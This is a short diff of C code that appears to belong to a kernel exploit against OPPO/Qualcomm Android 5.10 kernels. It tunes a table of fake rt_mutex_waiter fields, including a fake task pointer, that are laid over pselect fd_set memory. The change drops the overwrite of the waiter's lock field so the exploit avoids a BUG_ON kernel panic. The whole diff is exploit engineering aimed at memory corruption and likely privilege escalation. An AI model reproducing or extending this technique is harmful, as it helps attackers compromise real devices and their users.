@@ -106,7 +106,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   } words[] = {
 #ifdef PSELECT_WORDS_V5_10
     /* 5.10 rt_mutex_waiter: tree_entry@0, pi_tree_entry@0x18, task@0x30,
-     * lock@0x38, list@0x40 -- no augment prio/deadline, no wake_state. */
+     * lock@0x38, list@0x40 -- no augment prio/deadline, no wake_state.
+     * NOTE: word 9 (waiter->lock) is NOT overwritten: OPPO/QC 5.10
+     * remove_waiter has BUG_ON(rt_mutex_top_waiter(lock)->lock != lock)
+     * (brk #0x800) and the original lock field (real pi_mutex) must
+     * survive the fd_set overlay or the kernel panics on entry. */
     {2, 0, "tree_pc"},
     {3, 0, "tree_right"},
     {4, 0, "tree_left"},
@@ -114,7 +118,6 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {6, 0, "pi_right"},
     {7, 0, "pi_left"},
     {8, fake_task, "task"},
-    {9, fake_lock, "lock"},
     {10, 0, "list_next"},
     {11, 0, "list_prev"},
 #else
